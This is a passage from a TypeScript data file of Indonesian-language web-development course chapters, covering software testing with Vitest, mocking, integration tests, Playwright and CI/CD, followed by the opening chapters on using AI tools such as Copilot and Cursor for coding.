return;\n}\nconsole.log(result.data.name);  // Type-safe, data pasti ada" },

    explainAlong: "noUnusedLocals: true mencegah variabel yang tidak terpakai. Result<T, E> pattern memaksa handle error secara eksplisit — tidak ada exception yang terlewat.",

    aiPrompt: "Setup tsconfig.json dengan strict: true di proyekmu. Perbaiki semua error yang muncul setelah strict mode diaktifkan.",

    reflection: "Coba nonaktifkan strict: true sementara — berapa banyak any yang muncul? Itu adalah bug tersembunyi yang TypeScript selamatkanmu dari mereka.",

  },

];



// ============================================================

// MODUL 19: TESTING (6 chapters)

// ============================================================



const modul19: Chapter[] = [

  {

    id: "19.1",

    moduleId: 19,

    chapterNum: "19.1",

    title: "Testing: Mengapa Kode Butuh Diuji?",

    subtitle: "Filosofi testing dan perbedaan jenis test",

    level: "Pemula-Menengah",

    objectives: [

      "Memahami pentingnya testing",

      "Bisa membedakan unit, integration, dan E2E test",

      "Mengerti Test Pyramid",

    ],

    analogy: { diagram: "Test Pyramid:\n    /\\\n   /  \\\n  / E2E \\     ← Sedikit, lambat, mahal\n /─────────\\\n/ Integration\\  ← Sedang\n/──────────────\\\n/    Unit Test   \\ ← Banyak, cepat, murah", caption: "Unit test = banyak, cepat, murah. E2E = sedikit, lambat, tapi paling mirip user" },

    explanation: "Bayangkan kamu membuat pesawat paper dan melemparkannya untuk melihat apakah terbang. Itu adalah 'testing' — memverifikasi bahwa apa yang kamu buat bekerja seperti yang diharapkan. Di software development, testing adalah proses memverifikasi bahwa kode kamu bekerja dengan benar.\\n\\n**Kenapa Testing Penting?**\\n1. **Menangkap bug sebelum production**: Lebih murah fix bug di development daripada di production\\n2.\n\n**Refactoring dengan percaya diri**: Ubah kode tanpa takut merusak fitur yang sudah ada\\n3. **Dokumentasi hidup**: Test menunjukkan cara menggunakan kode kamu\\n4. **Design yang lebih baik**: Kode yang mudah di-test biasanya punya design yang lebih baik (loose coupling)\\n5. **Sleep better**: Deploy di Jumat malam tanpa khawatir 😄\\n\\n**Tiga Jenis Test Utama**\\n\\n**1.\n\nUnit Test** — Menguji bagian kode terkecil (fungsi, class) secara isolasi. Cepat, murah, banyak.\\n\\n**2. Integration Test** — Menguji bagaimana beberapa bagian bekerja sama. Database, API, service integration.\\n\\n**3.\n\nE2E (End-to-End) Test** — Menguji aplikasi dari perspektif user. Browser automation, user flows. Lambat, mahal, tapi paling mirip real world.\\n\\n**Test Pyramid**\\nPiramida ini menunjukkan berapa banyak test yang harus kamu tulis untuk setiap jenis:\\n\\n- **Unit test (70%)**: Ratusan atau ribuan test — dieksekusi dalam detik\\n- **Integration test (20%)**: Puluhan test — dieksekusi dalam menit\\n- **E2E test (10%)**: Beberapa test — dieksekusi dalam puluhan menit\\n\\nAnalogi: Unit test seperti memeriksa setiap baut pesawat. Integration test seperti memeriksa apakah sayap terpasang dengan benar.\n\nE2E test seperti terbangkan pesawatnya. Kamu periksa banyak baut, beberapa koneksi, dan terbangkan beberapa kali.\\n\\n**Testing Mindset**\\nTidak perlu 100% code coverage. Fokus pada:\\n- Business logic yang penting\\n- Edge cases (null, empty, error)\\n- Bug yang pernah terjadi (regression test)\\n- Happy path + 2-3 error paths",

    codeExample: { language: "typescript", code: "// Fungsi yang akan kita test\nexport function calculateDiscount(price: number, code: string): number {\n  if (price <= 0) throw new Error('Price must be positive');\n  \n  const discounts: Record<string, number> = {\n    'SAVE10': 0.10,\n    'SAVE20': 0.20,\n    'HALF': 0.50,\n  };\n  \n  const rate = discounts[code] ?? 0;\n  return price * (1 - rate);\n}\n\n// Unit test dengan Vitest (syntax mirip Jest)\nimport { describe, it, expect } from 'vitest';\n\ndescribe('calculateDiscount', () => {\n  // Happy path\n  it('applies 10% discount', () => {\n    expect(calculateDiscount(100, 'SAVE10')).toBe(90);\n  });\n  \n  it('applies 20% discount', () => {\n    expect(calculateDiscount(100, 'SAVE20')).toBe(80);\n  });\n  \n  // Edge case\n  it('returns original price for invalid code', () => {\n    expect(calculateDiscount(100, 'INVALID')).toBe(100);\n  });\n  \n  it('throws error for zero price', () => {\n    expect(() => calculateDiscount(0, 'SAVE10')).toThrow('Price must be positive');\n  });\n  \n  it('handles half price', () => {\n    expect(calculateDiscount(200, 'HALF')).toBe(100);\n  });\n});" },

    explainAlong: "describe() mengelompokkan test. it() mendefinisikan satu test case. expect() membuat assertion. Edge case: kode invalid dan price <= 0.",

    aiPrompt: "Tulis unit test untuk fungsi validasi email. Test: format valid, format invalid, empty string, dan domain yang tidak umum.",

    reflection: "Tanpa test, refactor adalah perjudian. Dengan test, refactor adalah investasi. Kamu lebih percaya diri yang mana?",

  },

  {

    id: "19.2",

    moduleId: 19,

    chapterNum: "19.2",

    title: "Vitest: Unit Testing Super Cepat",

    subtitle: "Setup dan tulis unit test dengan Vitest — test runner modern untuk Vite",

    level: "Menengah",

    objectives: [

      "Bisa setup Vitest di proyek",

      "Menguasai matcher dan assertion",

      "Mengerti mocking dasar",

    ],

    analogy: { diagram: "Vitest = Test runner untuk Vite ecosystem\n\nFeatures:\n├── Native ESM support\n├── TypeScript out of the box\n├── Jest-compatible API\n├── Watch mode super cepat\n└── UI mode untuk debugging", caption: "Vitest adalah test runner modern yang designed untuk Vite ecosystem — cepat, native ESM, dan TypeScript support tanpa config" },

    explanation: "Jest adalah test runner paling populer di ekosistem JavaScript. Tapi Jest dirilis sebelum ESM menjadi standar dan butuh banyak konfigurasi untuk TypeScript. Vitest datang sebagai alternatif modern yang designed untuk Vite ecosystem.\\n\\n**Kenapa Vitest?**\\n1. **Native ESM**: Vitest menggunakan native ES Modules — tidak perlu transformasi\\n2.\n\n**TypeScript built-in**: Tulis test dalam .ts tanpa config tambahan\\n3.\n\n**Jest-compatible API**: describe, it, expect — semuanya sama\\n4.\n\n**Super cepat**: Menggunakan Vite's transform pipeline — test jalan dalam milidetik\\n5.\n\n**UI Mode**: Visual test runner untuk debugging\\n\\n**Setup Vitest**\\n```bash\\nnpm install -D vitest @vitest/ui\\n# atau\\nbun add -d vitest\\n```\\n\\nTambahkan ke package.json:\\n```json\\n{\\n  \\\"scripts\\\": {\\n    \\\"test\\\": \\\"vitest\\\",\\n    \\\"test:ui\\\": \\\"vitest --ui\\\",\\n    \\\"test:run\\\": \\\"vitest run\\\"\\n  }\\n}\\n```\\n\\n**Naming Convention**\\nFile test bisa dinamai:\\n- `nama.test.ts` — file test terpisah\\n- `nama.spec.ts` — alternatif naming\\n- `__tests__/nama.ts` — di folder __tests__\\n\\nVitest otomatis mencari file yang match pattern: `**/*.{test,spec}.{js,ts}`\\n\\n**Assertion Matchers**\\nVitest (dan Jest) punya banyak matcher untuk berbagai kebutuhan:\\n\\n- `toBe()` — strict equality (===)\\n- `toEqual()` — deep equality (untuk object/array)\\n- `toBeTruthy()` / `toBeFalsy()` — truthy/falsy check\\n- `toBeNull()` / `toBeUndefined()` — null/undefined\\n- `toBeGreaterThan()` / `toBeLessThan()` — perbandingan\\n- `toContain()` — array/string contains\\n- `toThrow()` — exception thrown\\n- `toHaveLength()` — panjang array/string\\n- `toMatch()` — regex matching\\n\\n**Grouping dengan describe**\\nOrganize test dengan describe yang nested:\\n\\n```typescript\\ndescribe('UserService',\n\n() => {\\n  describe('create', () => {\\n    it('should create user with valid data', () => { ... });\\n    it('should reject duplicate email', () => { ... });\\n  });\\n  \\n  describe('findById', () => {\\n    it('should return user when found', () => { ... });\\n    it('should return null when not found', () => { ... });\\n  });\\n});\\n```",

    codeExample: { language: "typescript", code: "// vitest.config.ts\nimport { defineConfig } from 'vitest/config';\n\nexport default defineConfig({\n  test: {\n    globals: true,           // describe, it, expect global (tidak perlu import)\n    environment: 'node',     // atau 'jsdom' untuk DOM testing\n    include: ['src/**/*.{test,spec}.{js,ts}'],\n    coverage: {\n      provider: 'v8',\n      reporter: ['text', 'json', 'html'],\n      exclude: ['node_modules/', 'src/**/*.d.ts'],\n    },\n  },\n  resolve: {\n    alias: {\n      '@/': new URL('./src/', import.meta.url).pathname,\n    },\n  },\n});\n\n// UserService test\nimport { describe, it, expect, beforeEach } from 'vitest';\nimport { UserService } from './UserService';\n\n// In-memory database untuk test\nconst users: User[] = [];\n\ndescribe('UserService', () => {\n  let service: UserService;\n  \n  beforeEach(() => {\n    users.length = 0;  // Clear array\n    service = new UserService(users);\n  });\n  \n  describe('create', () => {\n    it('creates user with valid data', () => {\n      const user = service.create({ name: 'Budi', email: 'budi@mail.com' });\n      expect(user.id).toBeDefined();\n      expect(user.name).toBe('Budi');\n      expect(users).toHaveLength(1);\n    });\n    \n    it('rejects duplicate email', () => {\n      service.create({ name: 'Budi', email: 'budi@mail.com' });\n      expect(() =>\n        service.create({ name: 'Ani', email: 'budi@mail.com' })\n      ).toThrow('Email already exists');\n    });\n  });\n  \n  describe('findById', () => {\n    it('returns user when found', () => {\n      const created = service.create({ name: 'Budi', email: 'budi@mail.com' });\n      const found = service.findById(created.id);\n      expect(found).toEqual(created);\n    });\n    \n    it('returns null when not found', () => {\n      const found = service.findById(999);\n      expect(found).toBeNull();\n    });\n  });\n});" },

    explainAlong: "beforeEach() berjalan sebelum setiap test — setup fresh state. In-memory array sebagai mock database. toEqual() untuk deep comparison object.",

    aiPrompt: "Setup Vitest di proyek Vite + TypeScript-mu. Tulis unit test untuk service layer yang sudah kamu buat (userService, productService, dll).",

    reflection: "Jalankan vitest --ui dan lihat visual test runner. Berapa persen code coverage-mu saat ini?",

  },

  {

    id: "19.3",

    moduleId: 19,

    chapterNum: "19.3",

    title: "Mocking: Isolasi dan Simulasi Dependency",

    subtitle: "Kuasai teknik mocking untuk test yang fokus dan reliable",

    level: "Menengah",

    objectives: [

      "Bisa membuat mock functions dan modules",

      "Mengerti spy, stub, dan fake",

      "Menguasai vi.fn() dan vi.mock() di Vitest",

    ],

    analogy: { diagram: "Mocking Types:\n├── Mock Function: vi.fn() → simulasi fungsi\n├── Spy: vi.spyOn() → pantau call tanpa ganti behavior\n├── Stub: ganti implementasi\n└── Fake: object pengganti sederhana", caption: "Mocking memungkinkan test unit yang terisolasi dari dependency external" },

    explanation: "Salah satu prinsip unit testing adalah isolasi — test satu unit kode tanpa bergantung pada unit lain. Tapi di dunia nyata, fungsi bergantung pada fungsi lain, database, API, file system. Mocking adalah teknik mengganti dependency dengan versi palsu yang bisa dikontrol.\\n\\n**Mengapa Mocking?**\\n1. **Isolasi**: Test UserService tanpa database nyata\\n2.\n\n**Speed**: Mock lebih cepat daripada call external\\n3.\n\n**Deterministic**: Mock return nilai yang predictable\\n4.\n\n**Error simulation**: Simulasi error yang sulah direproduksi (network failure, timeout)\\n\\n**Mock Function dengan vi.fn()**\\nBuat fungsi palsu yang bisa track pemanggilan:\\n\\n```typescript\\nconst mockFn = vi.fn();\\nmockFn('hello');\\nmockFn('world');\\n\\nexpect(mockFn).toHaveBeenCalledTimes(2);\\nexpect(mockFn).toHaveBeenCalledWith('hello');\\nexpect(mockFn).toHaveBeenNthCalledWith(2, 'world');\\n```\\n\\n**Mock dengan Return Value**\\n\\n```typescript\\nconst mockFn = vi.fn().mockReturnValue(42);\\nconsole.log(mockFn());  // 42\\n\\nconst mockFn = vi.fn()\\n  .mockReturnValueOnce('first')\\n  .mockReturnValueOnce('second')\\n  .mockReturnValue('default');\\n```\\n\\n**Spy dengan vi.spyOn()**\\nPantau method yang sudah ada tanpa mengganti behavior:\\n\\n```typescript\\nconst spy = vi.spyOn(console,\n\n'log');\\nconsole.log('hello');\\nexpect(spy).toHaveBeenCalledWith('hello');\\nspy.mockRestore();  // Kembalikan ke asli\\n```\\n\\n**Mock Module dengan vi.mock()**\\nGanti seluruh module dengan mock:\\n\\n```typescript\\nvi.mock('./database', () => ({\\n  query: vi.fn().mockResolvedValue([{ id: 1, name: 'Budi' }]),\\n  connect: vi.fn(),\\n}));\\n```\\n\\n**Fake Object**\\nBuat implementasi sederhana dari interface:\\n\\n```typescript\\nclass FakeUserRepository implements UserRepository {\\n  private users: User[] = [];\\n  async save(user: User) { this.users.push(user); return user; }\\n  async findById(id: number) { return this.users.find(u => u.id === id) ?? null; }\\n}\\n```",

    codeExample: { language: "typescript", code: "// Mocking API call dengan vi.fn()\nimport { describe, it, expect, vi } from 'vitest';\n\n// Service yang akan kita test\nclass PaymentService {\n  constructor(private api: { charge: (amount: number) => Promise<{ id: string }> }) {}\n  \n  async processPayment(amount: number, userId: string) {\n    if (amount <= 0) throw new Error('Invalid amount');\n    const result = await this.api.charge(amount);\n    return { paymentId: result.id, amount, userId, status: 'success' as const };\n  }\n}\n\ndescribe('PaymentService', () => {\n  it('processes valid payment', async () => {\n    const mockApi = { charge: vi.fn().mockResolvedValue({ id: 'pay_123' }) };\n    const service = new PaymentService(mockApi);\n    \n    const result = await service.processPayment(100, 'user_1');\n    \n    expect(result.paymentId).toBe('pay_123');\n    expect(result.amount).toBe(100);\n    expect(mockApi.charge).toHaveBeenCalledWith(100);\n    expect(mockApi.charge).toHaveBeenCalledTimes(1);\n  });\n  \n  it('rejects invalid amount', async () => {\n    const mockApi = { charge: vi.fn() };\n    const service = new PaymentService(mockApi);\n    \n    await expect(service.processPayment(0, 'user_1'))\n      .rejects.toThrow('Invalid amount');\n    expect(mockApi.charge).not.toHaveBeenCalled();\n  });\n  \n  it('handles API failure', async () => {\n    const mockApi = {\n      charge: vi.fn().mockRejectedValue(new Error('Network error')),\n    };\n    const service = new PaymentService(mockApi);\n    \n    await expect(service.processPayment(100, 'user_1'))\n      .rejects.toThrow('Network error');\n  });\n});" },

    explainAlong: "Mock API charge memungkinkan test PaymentService tanpa payment gateway nyata. mockResolvedValue untuk simulasi sukses, mockRejectedValue untuk simulasi error. not.toHaveBeenCalled() memastikan charge tidak dipanggil untuk input invalid.",

    aiPrompt: "Tulis test untuk email service dengan mock SMTP client. Test: email terkirim, retry saat failure, dan rate limiting.",

    reflection: "Bedanya stub vs spy vs mock: stub = ganti return value, spy = pantau tanpa ganti, mock = stub + spy. Kapan pakai masing-masing?",

  },

  {

    id: "19.4",

    moduleId: 19,

    chapterNum: "19.4",

    title: "Integration Test: Database dan API",

    subtitle: "Uji bagaimana bagian-bagian aplikasi bekerja sama",

    level: "Menengah",

    objectives: [

      "Bisa menulis integration test untuk database",

      "Mengerti test lifecycle (setup/teardown)",

      "Mengerti test database pattern",

    ],

    analogy: { diagram: "Integration Test Scope:\nUnit A + Unit B + Database\n         ↓\n    Integration Test", caption: "Integration test menguji interaksi antar komponen — lebih realistis daripada unit test tapi lebih cepat daripada E2E" },

    explanation: "Unit test mengisolasi satu fungsi. Integration test menguji bagaimana beberapa bagian bekerja sama. Di backend, integration test paling umum menguji: route handler + service + database.\\n\\n**Kenapa Integration Test Penting?**\\nUnit test bisa passing 100% tapi aplikasi tetap rusak kalau bagian-bagian tidak terintegrasi dengan benar. Contoh: UserService.create() dan UserRepository.save() masing-masing berjalan benar, tapi UserService memanggil repository dengan argumen yang salah.\n\nIntegration test menangkap bug di boundary antar komponen.\\n\\n**Test Database Pattern**\\nStrategi untuk test yang melibatkan database:\\n\\n1.\n\n**In-Memory Database**: SQLite :memory: untuk test cepat\\n2.\n\n**Test Container**: Docker container dengan database nyata\\n3.\n\n**Test Schema**: Schema terpisah di database yang sama\\n\\nSQLite in-memory paling populer karena tidak perlu setup infrastruktur, cepat (data di memory), dan auto-cleanup.\\n\\n**Lifecycle Hooks**\\nVitest punya hooks untuk setup dan cleanup:\\n\\n- beforeAll() — sekali sebelum semua test\\n- beforeEach() — sebelum setiap test\\n- afterEach() — setelah setiap test\\n- afterAll() — sekali setelah semua test\\n\\nPattern umum: setup DB di beforeAll,\n\nClear data di beforeEach, disconnect di afterAll.\\n\\n**Testing API dengan Hono**\\nHono punya helper app.request() untuk testing tanpa HTTP server nyata:",

    codeExample: { language: "typescript", code: "// Integration test: Route → Service → Database\nimport { describe, it, expect, beforeAll, beforeEach, afterAll } from 'vitest';\nimport { Database } from 'bun:sqlite';\nimport { drizzle } from 'drizzle-orm/bun-sqlite';\n\nconst sqlite = new Database(':memory:');\nconst db = drizzle(sqlite);\n\nbeforeAll(async () => {\n  await db.run(\\`CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\\`);\n});\n\nbeforeEach(async () => {\n  await db.run(\\`DELETE FROM users\\`);\n});\n\nafterAll(() => sqlite.close());\n\ndescribe('POST /api/users', () => {\n  it('creates user and returns 201', async () => {\n    const res = await app.request('/api/users', {\n      method: 'POST',\n      body: JSON.stringify({ name: 'Budi', email: 'budi@mail.com' }),\n      headers: { 'Content-Type': 'application/json' },\n    });\n    expect(res.status).toBe(201);\n    const body = await res.json();\n    expect(body.name).toBe('Budi');\n  });\n  \n  it('returns 400 for invalid data', async () => {\n    const res = await app.request('/api/users', {\n      method: 'POST',\n      body: JSON.stringify({ name: '' }),\n      headers: { 'Content-Type': 'application/json' },\n    });\n    expect(res.status).toBe(400);\n  });\n});" },

    explainAlong: ":memory: database = fresh database untuk setiap test run. beforeEach clear mencegah test pollution.",

    aiPrompt: "Tulis integration test untuk endpoint login: valid credentials, invalid password, non-existent user.",

    reflection: "Integration test lebih lambat dari unit test. Berapa lama test suite-mu? Kalau > 30 detik, pertimbangkan mana yang bisa di-downgrade ke unit test.",

  },

  {

    id: "19.5",

    moduleId: 19,

    chapterNum: "19.5",

    title: "E2E Testing dengan Playwright",

    subtitle: "Uji aplikasi dari perspektif user nyata",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa setup Playwright",

      "Menguasai locator, actions, dan assertions",

      "Mengerti test isolation dan fixtures",

    ],

    analogy: { diagram: "Playwright:\n├── Multi-browser (Chrome, Firefox, Safari)\n├── Auto-wait (tidak perlu sleep)\n├── Codegen (rekam jadi test)\n├── Trace viewer\n└── Parallel execution", caption: "Playwright adalah E2E testing framework modern dari Microsoft — cepat, reliable, dan developer-friendly" },

    explanation: "E2E test menguji aplikasi seperti user nyata: buka browser, klik tombol, isi form, navigasi halaman. Ini adalah test yang paling mirip dengan apa yang user lakukan.\\n\\n**Kenapa Playwright?**\\n1. **Auto-wait**: Playwright otomatis menunggu elemen siap — tidak perlu sleep atau waitFor manual\\n2. **Multi-browser**: Chrome, Firefox, Safari — semuanya dengan satu API\\n3.\n\n**Codegen**: Rekam interaksi browser dan generate test script otomatis\\n4.\n\n**Trace viewer**: Lihat screenshot, video, dan network log saat test gagal\\n5.\n\n**Speed**: Parallel execution dan worker isolation\\n\\n**Setup Playwright**\\n\\n    npm init playwright@latest\\n\\n**Locator Strategies**\\nPlaywright menyarankan menggunakan atribut data-testid atau semantic locators:\\n\\n    page.getByTestId('submit-button')\\n    page.getByRole('button',\n\n{ name: 'Submit' })\\n    page.getByLabel('Email')\\n    page.getByPlaceholder('Enter email')\\n\\n**Test Isolation**\\nSetiap test berjalan di context browser terpisah — cookies, localStorage, dan session tidak bocor antar test.\\n\\n**Fixtures**\\nFixtures adalah mekanisme setup/teardown.\n\nBisa extend untuk custom setup seperti authenticated state.",

    codeExample: { language: "typescript", code: "// tests/auth.spec.ts\nimport { test, expect } from '@playwright/test';\n\ntest.describe('Authentication', () => {\n  test('user can login', async ({ page }) => {\n    await page.goto('/login');\n    await page.getByLabel('Email').fill('user@example.com');\n    await page.getByLabel('Password').fill('password123');\n    await page.getByRole('button', { name: 'Login' }).click();\n    await expect(page).toHaveURL('/dashboard');\n    await expect(page.getByText('Welcome back')).toBeVisible();\n  });\n  \n  test('shows error for invalid credentials', async ({ page }) => {\n    await page.goto('/login');\n    await page.getByLabel('Email').fill('wrong@example.com');\n    await page.getByLabel('Password').fill('wrong');\n    await page.getByRole('button', { name: 'Login' }).click();\n    await expect(page.getByText('Invalid credentials')).toBeVisible();\n  });\n  \n  test('user can logout', async ({ page }) => {\n    await page.goto('/login');\n    await page.getByLabel('Email').fill('user@example.com');\n    await page.getByLabel('Password').fill('password123');\n    await page.getByRole('button', { name: 'Login' }).click();\n    await page.getByRole('button', { name: 'Menu' }).click();\n    await page.getByText('Logout').click();\n    await expect(page).toHaveURL('/login');\n  });\n});" },

    explainAlong: "getByLabel dan getByRole adalah locators yang accessible — tidak bergantung pada struktur DOM. toHaveURL memeriksa navigasi.",

    aiPrompt: "Setup Playwright untuk aplikasi React-mu. Tulis E2E test untuk flow: register → login → create post → logout.",

    reflection: "Gunakan Playwright codegen untuk merekam interaksi manual: npx playwright codegen. Bandingkan dengan test yang kamu tulis manual.",

  },

  {

    id: "19.6",

    moduleId: 19,

    chapterNum: "19.6",

    title: "Testing Strategy dan CI/CD",

    subtitle: "Integrasikan testing ke workflow development",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa setup test di CI/CD pipeline",

      "Mengerti code coverage dan threshold",

      "Mengerti TDD dan testing best practices",

    ],

    analogy: { diagram: "Testing in CI/CD:\nGit Push → Lint → Test → Build → Coverage → Deploy", caption: "Testing terintegrasi di CI/CD memastikan kualitas kode sebelum sampai ke production" },

    explanation: "Testing yang hanya berjalan di local machine tidak cukup.\n\nUntuk tim dan proyek production, test harus berjalan otomatis di CI/CD pipeline setiap kali ada push ke repository.\\n\\n**CI/CD Pipeline untuk Testing**\\n\\n    Git Push → Lint → Unit Test → Integration Test → Build → E2E Test → Deploy\\n\\nPipeline ini memastikan: kode mengikuti style guide,\n\nUnit test passing (cepat), integration test passing (sedang), build berhasil, E2E test passing (lambat), lalu deploy ke production.\\n\\n**Code Coverage**\\nCode coverage mengukur berapa persen kode yang dieksekusi oleh test.\n\nMetric: statement, branch, function, dan line coverage.\n\nTarget umum: 70-80%.\n\nJangan obsesi dengan 100% — fokus pada business logic.\\n\\n**TDD (Test-Driven Development)**\\nTDD adalah pendekatan menulis test SEBELUM menulis kode. Siklus Red-Green-Refactor:\\n1. Red: Tulis test yang gagal (karena kode belum ada)\\n2. Green: Tulis kode minimal agar test passing\\n3.\n\nRefactor: Perbaiki kode tanpa merusak test\\n\\nTDD cocok untuk business logic kompleks dan algoritma. Kurang cocok untuk UI exploration dan prototyping.\\n\\n**Testing Best Practices**\\n1. F.I.R.S.T.: Fast, Independent, Repeatable, Self-validating, Timely\\n2. Satu assertion per test (idealnya)\\n3.\n\nNama test deskriptif: 'should reject invalid email' bukan 'test email'\\n4. Arrange-Act-Assert: Setup → Execute → Verify\\n5. Test behavior, bukan implementation",

    codeExample: { language: "yaml", code: "# .github/workflows/test.yml\nname: Test\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: oven-sh/setup-bun@v1\n        with:\n          bun-version: latest\n      - run: bun install\n      - run: bun run lint\n      - run: bun test\n      - run: bun test --coverage\n      - run: bun run build\n      - uses: davelosert/vitest-coverage-report-action@v2\n        if: always()\n  e2e:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: oven-sh/setup-bun@v1\n      - run: bun install\n      - run: bunx playwright install --with-deps\n      - run: bun run dev &\n      - run: sleep 5\n      - run: bunx playwright test" },

    explainAlong: "Workflow berjalan di setiap push dan PR. Coverage report di-attach ke PR untuk review.",

    aiPrompt: "Setup GitHub Actions untuk proyek-mu: lint → test → build → deploy. Tambahkan coverage threshold 70%.",

    reflection: "Berapa lama pipeline CI/CD-mu berjalan? Kalau > 10 menit, pertimbangkan parallel jobs dan test splitting.",

  },

];



// ============================================================

// MODUL 20: AI UNTUK DEVELOPER (5 chapters)

// ============================================================



const modul20: Chapter[] = [

  {

    id: "20.1",

    moduleId: 20,

    chapterNum: "20.1",

    title: "AI untuk Developer: Paradigma Baru Programming",

    subtitle: "Cara kerja LLM dan bagaimana menggunakannya sebagai coding assistant",

    level: "Pemula-Menengah",

    objectives: [

      "Memahami cara kerja LLM secara dasar",

      "Bisa menggunakan AI untuk coding",

      "Mengerti batasan dan risiko AI",

    ],

    analogy: { diagram: "Developer + AI:\nDeveloper: Define problem, review code, make decisions\nAI: Generate code, explain concepts, debug, refactor\n\nTogether: 10x productivity", caption: "AI adalah force multiplier — memperkuat kemampuan developer, bukan menggantikannya" },

    explanation: "Tagline dari website ini adalah 'Belajar Web di Era AI'. Tapi apa artinya belajar programming di era AI? Apakah AI menggantikan developer? Apakah belajar coding sudah tidak perlu lagi?\\n\\n**AI Tidak Menggantikan Developer**\\nAI (khususnya Large Language Models/LLM) adalah tool — sama seperti IDE, debugger, atau Google Search.\n\nAI mempercepat apa yang kamu kerjakan, tapi kamu tetap yang bertanggung jawab untuk: memahami masalah, merancang solusi, mengevaluasi kode yang dihasilkan,\n\nDan membuat keputusan arsitektur.\\n\\n**Cara Kerja LLM (Sederhana)**\\nLLM seperti ChatGPT/Claude tidak 'berpikir' seperti manusia.\n\nMereka adalah model statistik yang memprediksi kata berikutnya berdasarkan triliunan kata yang pernah mereka lihat saat training.\n\nAnaloginya: LLM seperti autocomplete super canggih yang memprediksi seluruh paragraf, bukan hanya satu kata.\\n\\nKarena cara kerjanya, LLM:\\n- Sangat bagus untuk pattern yang umum (generate CRUD,\n\nUI components)\\n- Kadang 'halusinasi' — membuat informasi yang terdengar benar tapi sebenarnya salah\\n- Tidak punya pengertian kontekstual yang mendalam\\n- Perlu guidance yang jelas dari developer\\n\\n**Use Cases AI untuk Developer**\\n1.\n\n**Code generation**: Tulis prompt, dapatkan kode\\n2.\n\n**Code explanation**: Paste kode yang bingung, dapatkan penjelasan\\n3. **Debug assistant**: Berikan error message, dapatkan analisis\\n4. **Refactoring**: Minta AI memperbaiki struktur kode\\n5. **Documentation**: Generate docs dari kode\\n6.\n\n**Learning**: Tanyakan konsep programming\\n\\n**Batasan yang Harus Diketahui**\\n- AI bisa salah — selalu review kode yang dihasilkan\\n- AI tidak tahu konteks bisnis spesifik aplikasimu\\n- AI tidak bisa menggantikan judgment dan pengalaman\\n- Security: jangan paste kode sensitif ke public AI\\n\\n**Paradigma Baru**\\nDeveloper masa depan bukan yang hafal syntax, tapi yang pandai:\\n1. **Prompt engineering**: Menulis instruksi yang jelas untuk AI\\n2. **Code review**: Mengevaluasi kode AI dengan kritis\\n3. **Problem decomposition**: Memecah masalah jadi tugas yang bisa dikerjakan AI\\n4.\n\n**Human judgment**: Membuat keputusan yang AI tidak bisa",

    codeExample: { language: "markdown", code: "# Contoh interaksi dengan AI untuk coding\n\n## Prompt yang buruk:\n\"buat form login\"\n\n## Prompt yang baik:\n\"Buat komponen React form login dengan:\n- Email dan password input dengan validasi\n- Error state untuk invalid credentials\n- Loading state saat submit\n- Redirect ke /dashboard saat sukses\n- Gunakan TypeScript, Tailwind CSS, dan React Hook Form\n- Include test dengan Vitest\"\n\n## Hasil yang diharapkan dari AI:\n1. Kode yang lengkap dan siap pakai\n2. Penjelasan cara kerjanya\n3. Cara mengintegrasikan ke proyek existing\n4. Potential improvements\n\n## Selalu review dan tanyakan:\n- Apakah ada edge cases yang terlewat?\n- Apakah ada security issues?\n- Apakah code ini performant?\n- Apakah ada cara yang lebih idiomatic?" },

    explainAlong: "Prompt yang baik spesifik, kontekstual, dan structured. Prompt yang buruk terlalu vague.",

    aiPrompt: "Tulis 3 prompt untuk AI: satu yang buruk, satu yang sedang, satu yang optimal. Lihat perbedaan hasilnya.",

    reflection: "AI menghasilkan kode rata-rata dengan cepat. Developer yang bagai mengubah kode rata-rata menjadi kode yang excellent. Kamu bagian mana?",

  },

  {

    id: "20.2",

    moduleId: 20,

    chapterNum: "20.2",

    title: "Cursor & GitHub Copilot: AI di Dalam Editor",

    subtitle: "Gunakan AI yang terintegrasi langsung di code editor",

    level: "Menengah",

    objectives: [

      "Bisa menggunakan Cursor untuk coding",

      "Bisa menggunakan GitHub Copilot",

      "Mengerti perbedaan keduanya",

    ],

    analogy: { diagram: "AI Editor:\n├── Cursor: Chat + Edit + Generate (AI-first editor)\n├── GitHub Copilot: Inline autocomplete (IDE plugin)\n└── ChatGPT/Claude: Web interface (general purpose)", caption: "Cursor dan Copilot adalah dua pendekatan berbeda: Cursor adalah AI-first editor, Copilot adalah autocomplete super canggih" },

    explanation: "Ada dua pendekatan utama menggunakan AI untuk coding: AI yang terintegrasi di editor (Cursor, Copilot) dan AI yang diakses via web (ChatGPT, Claude). Mari pelajari yang paling populer.\\n\\n**GitHub Copilot: Inline Autocomplete**\\nCopilot adalah plugin untuk VS Code (dan editor lain) yang menampilkan suggestion kode saat kamu mengetik. Cara kerjanya:\\n\\n1. Kamu mulai menulis kode atau komentar\\n2.\n\nCopilot menganalisis context (file saat ini, file terbuka, cursor position)\\n3.\n\nCopilot menampilkan suggestion sebagai gray text\\n4.\n\nTekan Tab untuk menerima, atau lanjutkan mengetik untuk mengabaikan\\n\\nCopilot sangat bagus untuk:\\n- Boierplate code (loop, conditional, function structure)\\n- Pattern yang umum (fetch API,\n\nEvent handler)\\n- Comment-to-code (tulis komentar, Copilot generate kode)\\n- Unit test generation\\n\\n**Cursor: AI-First Code Editor**\\nCursor adalah fork dari VS Code yang membangun AI sebagai first-class citizen.\n\nFitur utama:\\n\\n1.\n\n**Chat**: Chat panel di sidebar untuk tanya jawab tentang kode\\n2. **Cmd+K**: Inline editing — pilih kode, tulis instruksi, AI edit langsung\\n3. **Composer**: Generate file/folder baru dari deskripsi\\n4. **@ references**: Referensi ke file, fungsi, atau documentation\\n5.\n\n**Codebase understanding**: AI mengerti seluruh codebase kamu\\n\\n**Cursor vs Copilot**\\n\\n| Fitur | Copilot | Cursor |\\n|-------|---------|--------|\\n| Autocomplete | Excellent | Good |\\n| Chat | Tidak ada | Built-in |\\n| Code editing | Inline | Chat + Inline |\\n| Context | File saat ini | Seluruh codebase |\\n| Price | $10/bulan | Free tier + Pro |\\n\\n**Tips Menggunakan AI Editor**\\n1. Jangan terima suggestion tanpa membaca — AI sering salah\\n2. Gunakan komentar deskriptif untuk guide 